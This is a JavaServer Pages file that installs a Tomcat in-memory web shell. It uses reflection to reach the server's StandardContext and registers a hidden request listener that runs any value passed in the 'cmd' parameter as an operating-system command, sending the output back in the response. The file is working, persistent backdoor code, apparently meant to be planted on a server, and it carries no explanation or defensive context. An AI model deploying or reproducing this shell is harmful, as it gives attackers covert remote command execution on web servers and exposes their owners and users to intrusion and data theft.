<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.List" %>
<%@ page import="java.util.Arrays" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%!

    class ListenerMemShell implements ServletRequestListener {

        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            String cmd;
            try {
                cmd = sre.getServletRequest().getParameter("cmd");
                org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();
                Field requestField = Class.forName("org.apache.catalina.connector.RequestFacade").getDeclaredField("request");
                requestField.setAccessible(true);
                Request request = (Request) requestField.get(requestFacade);
                Response response = request.getResponse();

                if (cmd != null){
                    InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                    int i = 0;
                    byte[] bytes = new byte[1024];
                    while ((i=inputStream.read(bytes)) != -1){
                        response.getWriter().write(new String(bytes,0,i));
                        response.getWriter().write("\r\n");
                    }
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }

        @Override
        public void requestDestroyed(ServletRequestEvent sre) {
        }
    }
%>

<%
    ServletContext servletContext =  request.getServletContext();
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");
    applicationContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);

    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

    Object[] objects = standardContext.getApplicationEventListeners();
    List<Object> listeners = Arrays.asList(objects);
    List<Object> arrayList = new ArrayList(listeners);
    arrayList.add(new ListenerMemShell());
    standardContext.setApplicationEventListeners(arrayList.toArray());

%>